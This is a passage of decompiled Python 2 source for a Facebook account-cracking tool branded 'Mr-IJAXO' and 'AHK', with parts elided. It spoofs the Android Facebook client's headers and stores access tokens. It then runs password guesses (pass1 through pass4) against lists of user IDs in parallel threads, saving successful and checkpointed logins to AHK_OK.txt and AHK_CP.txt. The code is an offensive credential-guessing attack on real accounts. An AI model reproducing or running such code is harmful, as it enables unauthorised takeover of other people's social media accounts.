...
# Time Succes decompile : 2022-03-29 19:57:52.279533
...
header = {'x-fb-connection-bandwidth': repr(bd),
   ...
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,w>
...
def ip():
    ...
    time.sleep(2)                                                                                                                                print '\x1b[1;92m Your country: ' + country
    time.sleep(2)
...
def log_menu():
    try:
        t_check = open('access_token.txt', 'r')                                                                                                      menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        ...
        print '\x1b[1;92m[3] Follow Mr-IJAXO On Fb'
        print ''
        log_menu_s()
        
def log_menu_s():
    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Mr-IJAXO\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def log_fb():
    ...
    try:
        ...
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')                                                                                                           ts.write(q['loc'])
            ts.close()
            menu()
...
def a_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;95m[AHK-OK]\xe2\x9e\xa4 ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/AHK_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;97m[AHK-CP]\xe2\x9e\xa4 ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;95m[AHK-OK]\xe2\x9e\xa4 ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/AHK_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;97m[AHK-CP]\xe2\x9e\xa4 ' + uid + ' | ' + pass2
                    cp = open('AHK_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;95m[AHK-OK]\xe2\x9e\xa4 ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/AHK_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;97m[AHK-CP]\xe2\x9e\xa4 ' + uid + ' | ' + pass3
                        cp = open('AHK_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;95m[AHK-OK]\xe2\x9e\xa4 ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/AHK_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;97m[AHK-CP]\xe2\x9e\xa4 ' + uid + ' | ' + pass4
                            cp = open('AHK_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mAHK MEAN AZAB HACKING KILLER'
